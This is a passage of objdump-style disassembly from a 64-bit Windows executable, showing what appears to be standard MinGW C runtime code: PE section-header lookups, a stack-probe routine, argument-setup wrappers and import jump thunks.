   1400025bc:	48 83 c4 28          	add    $0x28,%rsp
   1400025c0:	c3                   	ret
   1400025c1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400025c8:	00 00 00 00 
   1400025cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400025d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400025d4:	48 8b 0d c5 1e 00 00 	mov    0x1ec5(%rip),%rcx        # 0x1400044a0
   1400025db:	31 c0                	xor    %eax,%eax
   1400025dd:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   1400025e2:	75 12                	jne    0x1400025f6
   1400025e4:	e8 27 fe ff ff       	call   0x140002410
   1400025e9:	85 c0                	test   %eax,%eax
   1400025eb:	74 09                	je     0x1400025f6
   1400025ed:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400025f1:	0f b7 44 08 06       	movzwl 0x6(%rax,%rcx,1),%eax
   1400025f6:	48 83 c4 28          	add    $0x28,%rsp
   1400025fa:	c3                   	ret
   1400025fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002600:	48 83 ec 28          	sub    $0x28,%rsp
   140002604:	45 31 c0             	xor    %r8d,%r8d
   140002607:	49 89 c9             	mov    %rcx,%r9
   14000260a:	48 8b 0d 8f 1e 00 00 	mov    0x1e8f(%rip),%rcx        # 0x1400044a0
   140002611:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002616:	75 4c                	jne    0x140002664
   140002618:	e8 f3 fd ff ff       	call   0x140002410
   14000261d:	85 c0                	test   %eax,%eax
   14000261f:	74 43                	je     0x140002664
   140002621:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002625:	48 01 c1             	add    %rax,%rcx
   140002628:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   14000262c:	4c 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%r8
   140002631:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140002635:	85 c0                	test   %eax,%eax
   140002637:	74 28                	je     0x140002661
   140002639:	83 e8 01             	sub    $0x1,%eax
   14000263c:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002640:	49 8d 44 c0 28       	lea    0x28(%r8,%rax,8),%rax
   140002645:	0f 1f 00             	nopl   (%rax)
   140002648:	41 f6 40 27 20       	testb  $0x20,0x27(%r8)
   14000264d:	74 09                	je     0x140002658
   14000264f:	4d 85 c9             	test   %r9,%r9
   140002652:	74 10                	je     0x140002664
   140002654:	49 83 e9 01          	sub    $0x1,%r9
   140002658:	49 83 c0 28          	add    $0x28,%r8
   14000265c:	49 39 c0             	cmp    %rax,%r8
   14000265f:	75 e7                	jne    0x140002648
   140002661:	45 31 c0             	xor    %r8d,%r8d
   140002664:	4c 89 c0             	mov    %r8,%rax
   140002667:	48 83 c4 28          	add    $0x28,%rsp
   14000266b:	c3                   	ret
   14000266c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002670:	48 83 ec 28          	sub    $0x28,%rsp
   140002674:	48 8b 0d 25 1e 00 00 	mov    0x1e25(%rip),%rcx        # 0x1400044a0
   14000267b:	45 31 c0             	xor    %r8d,%r8d
   14000267e:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002683:	75 0b                	jne    0x140002690
   140002685:	e8 86 fd ff ff       	call   0x140002410
   14000268a:	85 c0                	test   %eax,%eax
   14000268c:	4c 0f 45 c1          	cmovne %rcx,%r8
   140002690:	4c 89 c0             	mov    %r8,%rax
   140002693:	48 83 c4 28          	add    $0x28,%rsp
   140002697:	c3                   	ret
   140002698:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000269f:	00 
   1400026a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400026a4:	4c 8b 0d f5 1d 00 00 	mov    0x1df5(%rip),%r9        # 0x1400044a0
   1400026ab:	31 c0                	xor    %eax,%eax
   1400026ad:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
   1400026b3:	49 89 c8             	mov    %rcx,%r8
   1400026b6:	75 57                	jne    0x14000270f
   1400026b8:	4c 89 c9             	mov    %r9,%rcx
   1400026bb:	e8 50 fd ff ff       	call   0x140002410
   1400026c0:	85 c0                	test   %eax,%eax
   1400026c2:	74 4b                	je     0x14000270f
   1400026c4:	49 63 41 3c          	movslq 0x3c(%r9),%rax
   1400026c8:	4c 89 c1             	mov    %r8,%rcx
   1400026cb:	4c 29 c9             	sub    %r9,%rcx
   1400026ce:	49 01 c1             	add    %rax,%r9
   1400026d1:	41 0f b7 41 14       	movzwl 0x14(%r9),%eax
   1400026d6:	41 0f b7 51 06       	movzwl 0x6(%r9),%edx
   1400026db:	49 8d 44 01 18       	lea    0x18(%r9,%rax,1),%rax
   1400026e0:	85 d2                	test   %edx,%edx
   1400026e2:	74 29                	je     0x14000270d
   1400026e4:	83 ea 01             	sub    $0x1,%edx
   1400026e7:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   1400026eb:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   1400026f0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   1400026f4:	4c 89 c2             	mov    %r8,%rdx
   1400026f7:	4c 39 c1             	cmp    %r8,%rcx
   1400026fa:	72 08                	jb     0x140002704
   1400026fc:	03 50 08             	add    0x8(%rax),%edx
   1400026ff:	48 39 d1             	cmp    %rdx,%rcx
   140002702:	72 14                	jb     0x140002718
   140002704:	48 83 c0 28          	add    $0x28,%rax
   140002708:	4c 39 c8             	cmp    %r9,%rax
   14000270b:	75 e3                	jne    0x1400026f0
   14000270d:	31 c0                	xor    %eax,%eax
   14000270f:	48 83 c4 28          	add    $0x28,%rsp
   140002713:	c3                   	ret
   140002714:	0f 1f 40 00          	nopl   0x0(%rax)
   140002718:	8b 40 24             	mov    0x24(%rax),%eax
   14000271b:	f7 d0                	not    %eax
   14000271d:	c1 e8 1f             	shr    $0x1f,%eax
   140002720:	48 83 c4 28          	add    $0x28,%rsp
   140002724:	c3                   	ret
   140002725:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000272c:	00 00 00 00 
   140002730:	48 83 ec 28          	sub    $0x28,%rsp
   140002734:	4c 8b 1d 65 1d 00 00 	mov    0x1d65(%rip),%r11        # 0x1400044a0
   14000273b:	45 31 c9             	xor    %r9d,%r9d
   14000273e:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   140002744:	41 89 c8             	mov    %ecx,%r8d
   140002747:	75 5f                	jne    0x1400027a8
   140002749:	4c 89 d9             	mov    %r11,%rcx
   14000274c:	e8 bf fc ff ff       	call   0x140002410
   140002751:	85 c0                	test   %eax,%eax
   140002753:	74 53                	je     0x1400027a8
   140002755:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
   140002759:	4c 01 d9             	add    %r11,%rcx
   14000275c:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
   140002762:	85 c0                	test   %eax,%eax
   140002764:	74 42                	je     0x1400027a8
   140002766:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   14000276a:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
   14000276f:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
   140002773:	85 c9                	test   %ecx,%ecx
   140002775:	74 31                	je     0x1400027a8
   140002777:	83 e9 01             	sub    $0x1,%ecx
   14000277a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000277e:	4c 8d 54 ca 28       	lea    0x28(%rdx,%rcx,8),%r10
   140002783:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002788:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
   14000278c:	4c 89 c9             	mov    %r9,%rcx
   14000278f:	4c 39 c8             	cmp    %r9,%rax
   140002792:	72 08                	jb     0x14000279c
   140002794:	03 4a 08             	add    0x8(%rdx),%ecx
   140002797:	48 39 c8             	cmp    %rcx,%rax
   14000279a:	72 14                	jb     0x1400027b0
   14000279c:	48 83 c2 28          	add    $0x28,%rdx
   1400027a0:	4c 39 d2             	cmp    %r10,%rdx
   1400027a3:	75 e3                	jne    0x140002788
   1400027a5:	45 31 c9             	xor    %r9d,%r9d
   1400027a8:	4c 89 c8             	mov    %r9,%rax
   1400027ab:	48 83 c4 28          	add    $0x28,%rsp
   1400027af:	c3                   	ret
   1400027b0:	4c 01 d8             	add    %r11,%rax
   1400027b3:	eb 0b                	jmp    0x1400027c0
   1400027b5:	0f 1f 00             	nopl   (%rax)
   1400027b8:	41 83 e8 01          	sub    $0x1,%r8d
   1400027bc:	48 83 c0 14          	add    $0x14,%rax
   1400027c0:	8b 48 04             	mov    0x4(%rax),%ecx
   1400027c3:	85 c9                	test   %ecx,%ecx
   1400027c5:	75 07                	jne    0x1400027ce
   1400027c7:	8b 50 0c             	mov    0xc(%rax),%edx
   1400027ca:	85 d2                	test   %edx,%edx
   1400027cc:	74 d7                	je     0x1400027a5
   1400027ce:	45 85 c0             	test   %r8d,%r8d
   1400027d1:	7f e5                	jg     0x1400027b8
   1400027d3:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   1400027d7:	4d 01 d9             	add    %r11,%r9
   1400027da:	4c 89 c8             	mov    %r9,%rax
   1400027dd:	48 83 c4 28          	add    $0x28,%rsp
   1400027e1:	c3                   	ret
   1400027e2:	90                   	nop
   1400027e3:	90                   	nop
   1400027e4:	90                   	nop
   1400027e5:	90                   	nop
   1400027e6:	90                   	nop
   1400027e7:	90                   	nop
   1400027e8:	90                   	nop
   1400027e9:	90                   	nop
   1400027ea:	90                   	nop
   1400027eb:	90                   	nop
   1400027ec:	90                   	nop
   1400027ed:	90                   	nop
   1400027ee:	90                   	nop
   1400027ef:	90                   	nop
   1400027f0:	51                   	push   %rcx
   1400027f1:	50                   	push   %rax
   1400027f2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   1400027f8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   1400027fd:	72 19                	jb     0x140002818
   1400027ff:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002806:	48 83 09 00          	orq    $0x0,(%rcx)
   14000280a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140002810:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002816:	77 e7                	ja     0x1400027ff
   140002818:	48 29 c1             	sub    %rax,%rcx
   14000281b:	48 83 09 00          	orq    $0x0,(%rcx)
   14000281f:	58                   	pop    %rax
   140002820:	59                   	pop    %rcx
   140002821:	c3                   	ret
   140002822:	90                   	nop
   140002823:	90                   	nop
   140002824:	90                   	nop
   140002825:	90                   	nop
   140002826:	90                   	nop
   140002827:	90                   	nop
   140002828:	90                   	nop
   140002829:	90                   	nop
   14000282a:	90                   	nop
   14000282b:	90                   	nop
   14000282c:	90                   	nop
   14000282d:	90                   	nop
   14000282e:	90                   	nop
   14000282f:	90                   	nop
   140002830:	48 83 ec 38          	sub    $0x38,%rsp
   140002834:	45 31 c9             	xor    %r9d,%r9d
   140002837:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   14000283c:	49 89 d0             	mov    %rdx,%r8
   14000283f:	48 89 ca             	mov    %rcx,%rdx
   140002842:	31 c9                	xor    %ecx,%ecx
   140002844:	e8 7f 02 00 00       	call   0x140002ac8
   140002849:	48 83 c4 38          	add    $0x38,%rsp
   14000284d:	c3                   	ret
   14000284e:	90                   	nop
   14000284f:	90                   	nop
   140002850:	48 83 ec 48          	sub    $0x48,%rsp
   140002854:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140002859:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   14000285e:	49 89 d0             	mov    %rdx,%r8
   140002861:	48 89 ca             	mov    %rcx,%rdx
   140002864:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002869:	31 c9                	xor    %ecx,%ecx
   14000286b:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140002870:	45 31 c9             	xor    %r9d,%r9d
   140002873:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002878:	e8 4b 02 00 00       	call   0x140002ac8
   14000287d:	48 83 c4 48          	add    $0x48,%rsp
   140002881:	c3                   	ret
   140002882:	90                   	nop
   140002883:	90                   	nop
   140002884:	90                   	nop
   140002885:	90                   	nop
   140002886:	90                   	nop
   140002887:	90                   	nop
   140002888:	90                   	nop
   140002889:	90                   	nop
   14000288a:	90                   	nop
   14000288b:	90                   	nop
   14000288c:	90                   	nop
   14000288d:	90                   	nop
   14000288e:	90                   	nop
   14000288f:	90                   	nop
   140002890:	31 c0                	xor    %eax,%eax
   140002892:	c3                   	ret
   140002893:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000289a:	00 00 00 00 
   14000289e:	66 90                	xchg   %ax,%ax
   1400028a0:	41 54                	push   %r12
   1400028a2:	55                   	push   %rbp
   1400028a3:	57                   	push   %rdi
   1400028a4:	56                   	push   %rsi
   1400028a5:	53                   	push   %rbx
   1400028a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400028aa:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1400028af:	44 89 cd             	mov    %r9d,%ebp
   1400028b2:	48 89 d6             	mov    %rdx,%rsi
   1400028b5:	4c 89 c3             	mov    %r8,%rbx
   1400028b8:	48 89 cf             	mov    %rcx,%rdi
   1400028bb:	e8 78 02 00 00       	call   0x140002b38
   1400028c0:	31 c9                	xor    %ecx,%ecx
   1400028c2:	85 ed                	test   %ebp,%ebp
   1400028c4:	0f 95 c1             	setne  %cl
   1400028c7:	83 c1 01             	add    $0x1,%ecx
   1400028ca:	e8 51 02 00 00       	call   0x140002b20
   1400028cf:	e8 24 02 00 00       	call   0x140002af8
   1400028d4:	8b 00                	mov    (%rax),%eax
   1400028d6:	89 07                	mov    %eax,(%rdi)
   1400028d8:	e8 23 02 00 00       	call   0x140002b00
   1400028dd:	48 8b 00             	mov    (%rax),%rax
   1400028e0:	48 89 06             	mov    %rax,(%rsi)
   1400028e3:	e8 d8 02 00 00       	call   0x140002bc0
   1400028e8:	48 8b 00             	mov    (%rax),%rax
   1400028eb:	48 89 03             	mov    %rax,(%rbx)
   1400028ee:	4d 85 e4             	test   %r12,%r12
   1400028f1:	74 09                	je     0x1400028fc
   1400028f3:	41 8b 0c 24          	mov    (%r12),%ecx
   1400028f7:	e8 a4 02 00 00       	call   0x140002ba0
   1400028fc:	31 c0                	xor    %eax,%eax
   1400028fe:	48 83 c4 20          	add    $0x20,%rsp
   140002902:	5b                   	pop    %rbx
   140002903:	5e                   	pop    %rsi
   140002904:	5f                   	pop    %rdi
   140002905:	5d                   	pop    %rbp
   140002906:	41 5c                	pop    %r12
   140002908:	c3                   	ret
   140002909:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002910:	41 54                	push   %r12
   140002912:	55                   	push   %rbp
   140002913:	57                   	push   %rdi
   140002914:	56                   	push   %rsi
   140002915:	53                   	push   %rbx
   140002916:	48 83 ec 20          	sub    $0x20,%rsp
   14000291a:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   14000291f:	44 89 cd             	mov    %r9d,%ebp
   140002922:	48 89 d6             	mov    %rdx,%rsi
   140002925:	4c 89 c3             	mov    %r8,%rbx
   140002928:	48 89 cf             	mov    %rcx,%rdi
   14000292b:	e8 10 02 00 00       	call   0x140002b40
   140002930:	31 c9                	xor    %ecx,%ecx
   140002932:	85 ed                	test   %ebp,%ebp
   140002934:	0f 95 c1             	setne  %cl
   140002937:	83 c1 01             	add    $0x1,%ecx
   14000293a:	e8 e9 01 00 00       	call   0x140002b28
   14000293f:	e8 b4 01 00 00       	call   0x140002af8
   140002944:	8b 00                	mov    (%rax),%eax
   140002946:	89 07                	mov    %eax,(%rdi)
   140002948:	e8 bb 01 00 00       	call   0x140002b08
   14000294d:	48 8b 00             	mov    (%rax),%rax
   140002950:	48 89 06             	mov    %rax,(%rsi)
   140002953:	e8 70 02 00 00       	call   0x140002bc8
   140002958:	48 8b 00             	mov    (%rax),%rax
   14000295b:	48 89 03             	mov    %rax,(%rbx)
   14000295e:	4d 85 e4             	test   %r12,%r12
   140002961:	74 09                	je     0x14000296c
   140002963:	41 8b 0c 24          	mov    (%r12),%ecx
   140002967:	e8 34 02 00 00       	call   0x140002ba0
   14000296c:	31 c0                	xor    %eax,%eax
   14000296e:	48 83 c4 20          	add    $0x20,%rsp
   140002972:	5b                   	pop    %rbx
   140002973:	5e                   	pop    %rsi
   140002974:	5f                   	pop    %rdi
   140002975:	5d                   	pop    %rbp
   140002976:	41 5c                	pop    %r12
   140002978:	c3                   	ret
   140002979:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002980:	41 54                	push   %r12
   140002982:	48 83 ec 20          	sub    $0x20,%rsp
   140002986:	49 89 cc             	mov    %rcx,%r12
   140002989:	e8 a2 01 00 00       	call   0x140002b30
   14000298e:	85 c0                	test   %eax,%eax
   140002990:	b8 00 00 00 00       	mov    $0x0,%eax
   140002995:	4c 0f 45 e0          	cmovne %rax,%r12
   140002999:	4c 89 e0             	mov    %r12,%rax
   14000299c:	48 83 c4 20          	add    $0x20,%rsp
   1400029a0:	41 5c                	pop    %r12
   1400029a2:	c3                   	ret
   1400029a3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400029aa:	00 00 00 00 
   1400029ae:	66 90                	xchg   %ax,%ax
   1400029b0:	53                   	push   %rbx
   1400029b1:	48 83 ec 20          	sub    $0x20,%rsp
   1400029b5:	89 cb                	mov    %ecx,%ebx
   1400029b7:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400029bc:	e8 ef 00 00 00       	call   0x140002ab0
   1400029c1:	41 89 d8             	mov    %ebx,%r8d
   1400029c4:	48 8d 15 55 1a 00 00 	lea    0x1a55(%rip),%rdx        # 0x140004420
   1400029cb:	48 89 c1             	mov    %rax,%rcx
   1400029ce:	48 83 c4 20          	add    $0x20,%rsp
   1400029d2:	5b                   	pop    %rbx
   1400029d3:	e9 78 fe ff ff       	jmp    0x140002850
   1400029d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400029df:	00 
   1400029e0:	48 83 ec 48          	sub    $0x48,%rsp
   1400029e4:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400029e9:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   1400029ee:	49 89 d0             	mov    %rdx,%r8
   1400029f1:	48 89 ca             	mov    %rcx,%rdx
   1400029f4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400029f9:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400029fe:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140002a03:	45 31 c9             	xor    %r9d,%r9d
   140002a06:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002a0b:	e8 c0 00 00 00       	call   0x140002ad0
   140002a10:	48 83 c4 48          	add    $0x48,%rsp
   140002a14:	c3                   	ret
   140002a15:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002a1c:	00 00 00 00 
   140002a20:	48 83 ec 28          	sub    $0x28,%rsp
   140002a24:	48 8b 05 95 1a 00 00 	mov    0x1a95(%rip),%rax        # 0x1400044c0
   140002a2b:	ff 10                	call   *(%rax)
   140002a2d:	e8 4e 00 00 00       	call   0x140002a80
   140002a32:	48 89 05 87 06 00 00 	mov    %rax,0x687(%rip)        # 0x1400030c0
   140002a39:	e8 3a 00 00 00       	call   0x140002a78
   140002a3e:	48 89 05 73 06 00 00 	mov    %rax,0x673(%rip)        # 0x1400030b8
   140002a45:	e8 26 00 00 00       	call   0x140002a70
   140002a4a:	48 89 05 5f 06 00 00 	mov    %rax,0x65f(%rip)        # 0x1400030b0
   140002a51:	48 83 c4 28          	add    $0x28,%rsp
   140002a55:	c3                   	ret
   140002a56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002a5d:	00 00 00 
   140002a60:	eb be                	jmp    0x140002a20
   140002a62:	90                   	nop
   140002a63:	90                   	nop
   140002a64:	90                   	nop
   140002a65:	90                   	nop
   140002a66:	90                   	nop
   140002a67:	90                   	nop
   140002a68:	90                   	nop
   140002a69:	90                   	nop
   140002a6a:	90                   	nop
   140002a6b:	90                   	nop
   140002a6c:	90                   	nop
   140002a6d:	90                   	nop
   140002a6e:	90                   	nop
   140002a6f:	90                   	nop
   140002a70:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x140008508
   140002a76:	90                   	nop
   140002a77:	90                   	nop
   140002a78:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x140008510
   140002a7e:	90                   	nop
   140002a7f:	90                   	nop
   140002a80:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x140008518
   140002a86:	90                   	nop
   140002a87:	90                   	nop
   140002a88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002a8f:	00 
   140002a90:	ff 25 4a 5a 00 00    	jmp    *0x5a4a(%rip)        # 0x1400084e0
   140002a96:	90                   	nop
   140002a97:	90                   	nop
   140002a98:	ff 25 4a 5a 00 00    	jmp    *0x5a4a(%rip)        # 0x1400084e8
   140002a9e:	90                   	nop
   140002a9f:	90                   	nop
   140002aa0:	ff 25 4a 5a 00 00    	jmp    *0x5a4a(%rip)        # 0x1400084f0
   140002aa6:	90                   	nop
   140002aa7:	90                   	nop
   140002aa8:	ff 25 4a 5a 00 00    	jmp    *0x5a4a(%rip)        # 0x1400084f8
   140002aae:	90                   	nop
   140002aaf:	90                   	nop
   140002ab0:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084a0
   140002ab6:	90                   	nop
   140002ab7:	90                   	nop
   140002ab8:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084a8
   140002abe:	90                   	nop
   140002abf:	90                   	nop
   140002ac0:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084b0
   140002ac6:	90                   	nop
   140002ac7:	90                   	nop
   140002ac8:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084b8
   140002ace:	90                   	nop
   140002acf:	90                   	nop
   140002ad0:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084c0
   140002ad6:	90                   	nop
   140002ad7:	90                   	nop
   140002ad8:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084c8
   140002ade:	90                   	nop
   140002adf:	90                   	nop
   140002ae0:	ff 25 ea 59 00 00    	jmp    *0x59ea(%rip)        # 0x1400084d0
   140002ae6:	90                   	nop
   140002ae7:	90                   	nop
   140002ae8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002aef:	00 
   140002af0:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008418
   140002af6:	90                   	nop
   140002af7:	90                   	nop
   140002af8:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008420
   140002afe:	90                   	nop
   140002aff:	90                   	nop
   140002b00:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008428
   140002b06:	90                   	nop
   140002b07:	90                   	nop
   140002b08:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008430
   140002b0e:	90                   	nop
   140002b0f:	90                   	nop
   140002b10:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008438
   140002b16:	90                   	nop
   140002b17:	90                   	nop
   140002b18:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008440
   140002b1e:	90                   	nop
   140002b1f:	90                   	nop
   140002b20:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008448
   140002b26:	90                   	nop
   140002b27:	90                   	nop
   140002b28:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008450
   140002b2e:	90                   	nop
   140002b2f:	90                   	nop
   140002b30:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008458
   140002b36:	90                   	nop
   140002b37:	90                   	nop
   140002b38:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008460
   140002b3e:	90                   	nop
   140002b3f:	90                   	nop
   140002b40:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008468
   140002b46:	90                   	nop
   140002b47:	90                   	nop
   140002b48:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008470
   140002b4e:	90                   	nop
   140002b4f:	90                   	nop
   140002b50:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008478
   140002b56:	90                   	nop
   140002b57:	90                   	nop
   140002b58:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008480
   140002b5e:	90                   	nop
   140002b5f:	90                   	nop
   140002b60:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008488
   140002b66:	90                   	nop
   140002b67:	90                   	nop
   140002b68:	ff 25 22 59 00 00    	jmp    *0x5922(%rip)        # 0x140008490
   140002b6e:	90                   	nop
   140002b6f:	90                   	nop
   140002b70:	ff 25 8a 58 00 00    	jmp    *0x588a(%rip)        # 0x140008400
   140002b76:	90                   	nop
   140002b77:	90                   	nop
   140002b78:	ff 25 8a 58 00 00    	jmp    *0x588a(%rip)        # 0x140008408
   140002b7e:	90                   	nop
   140002b7f:	90                   	nop
   140002b80:	ff 25 6a 58 00 00    	jmp    *0x586a(%rip)        # 0x1400083f0
   140002b86:	90                   	nop
   140002b87:	90                   	nop
   140002b88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002b8f:	00 
   140002b90:	ff 25 4a 58 00 00    	jmp    *0x584a(%rip)        # 0x1400083e0
   140002b96:	90                   	nop
   140002b97:	90                   	nop
   140002b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002b9f:	00 
   140002ba0:	ff 25 12 58 00 00    	jmp    *0x5812(%rip)        # 0x1400083b8
   140002ba6:	90                   	nop
   140002ba7:	90                   	nop
   140002ba8:	ff 25 12 58 00 00    	jmp    *0x5812(%rip)        # 0x1400083c0
   140002bae:	90                   	nop
   140002baf:	90                   	nop
   140002bb0:	ff 25 12 58 00 00    	jmp    *0x5812(%rip)        # 0x1400083c8
   140002bb6:	90                   	nop
   140002bb7:	90                   	nop
   140002bb8:	ff 25 12 58 00 00    	jmp    *0x5812(%rip)        # 0x1400083d0
   140002bbe:	90                   	nop
   140002bbf:	90                   	nop
   140002bc0:	ff 25 da 57 00 00    	jmp    *0x57da(%rip)        # 0x1400083a0
   140002bc6:	90                   	nop
   140002bc7:	90                   	nop
   140002bc8:	ff 25 da 57 00 00    	jmp    *0x57da(%rip)        # 0x1400083a8
   140002bce:	90                   	nop
   140002bcf:	90                   	nop
   140002bd0:	ff 25 5a 59 00 00    	jmp    *0x595a(%rip)        # 0x140008530
   140002bd6:	90                   	nop
   140002bd7:	90                   	nop
   140002bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002bdf:	00 
   140002be0:	ff 25 aa 57 00 00    	jmp    *0x57aa(%rip)        # 0x140008390
   140002be6:	90                   	nop
   140002be7:	90                   	nop
   140002be8:	ff 25 9a 57 00 00    	jmp    *0x579a(%rip)        # 0x140008388
   140002bee:	90                   	nop
   140002bef:	90                   	nop
   140002bf0:	ff 25 8a 57 00 00    	jmp    *0x578a(%rip)        # 0x140008380
   140002bf6:	90                   	nop
   140002bf7:	90                   	nop
   140002bf8:	ff 25 7a 57 00 00    	jmp    *0x577a(%rip)        # 0x140008378
   140002bfe:	90                   	nop
   140002bff:	90                   	nop
   140002c00:	ff 25 6a 57 00 00    	jmp    *0x576a(%rip)        # 0x140008370
   140002c06:	90                   	nop
   140002c07:	90                   	nop
   140002c08:	ff 25 5a 57 00 00    	jmp    *0x575a(%rip)        # 0x140008368
   140002c0e:	90                   	nop
   140002c0f:	90                   	nop
   140002c10:	ff 25 4a 57 00 00    	jmp    *0x574a(%rip)        # 0x140008360
   140002c16:	90                   	nop
   140002c17:	90                   	nop
   140002c18:	ff 25 3a 57 00 00    	jmp    *0x573a(%rip)        # 0x140008358
   140002c1e:	90                   	nop
   140002c1f:	90                   	nop
   140002c20:	ff 25 2a 57 00 00    	jmp    *0x572a(%rip)        # 0x140008350
   140002c26:	90                   	nop
   140002c27:	90                   	nop
   140002c28:	ff 25 1a 57 00 00    	jmp    *0x571a(%rip)        # 0x140008348
   140002c2e:	90                   	nop
   140002c2f:	90                   	nop
   140002c30:	ff 25 0a 57 00 00    	jmp    *0x570a(%rip)        # 0x140008340
   140002c36:	90                   	nop
   140002c37:	90                   	nop
   140002c38:	ff 25 fa 56 00 00    	jmp    *0x56fa(%rip)        # 0x140008338
   140002c3e:	90                   	nop
   140002c3f:	90                   	nop
   140002c40:	ff 25 ea 56 00 00    	jmp    *0x56ea(%rip)        # 0x140008330
   140002c46:	90                   	nop
   140002c47:	90                   	nop
   140002c48:	ff 25 da 56 00 00    	jmp    *0x56da(%rip)        # 0x140008328
   140002c4e:	90                   	nop
   140002c4f:	90                   	nop
   140002c50:	ff 25 ca 56 00 00    	jmp    *0x56ca(%rip)        # 0x140008320
   140002c56:	90                   	nop
   140002c57:	90                   	nop
   140002c58:	ff 25 ba 56 00 00    	jmp    *0x56ba(%rip)        # 0x140008318
   140002c5e:	90                   	nop
   140002c5f:	90                   	nop
   140002c60:	e9 fb e8 ff ff       	jmp    0x140001560
   140002c65:	90                   	nop
   140002c66:	90                   	nop
   140002c67:	90                   	nop
   140002c68:	90                   	nop
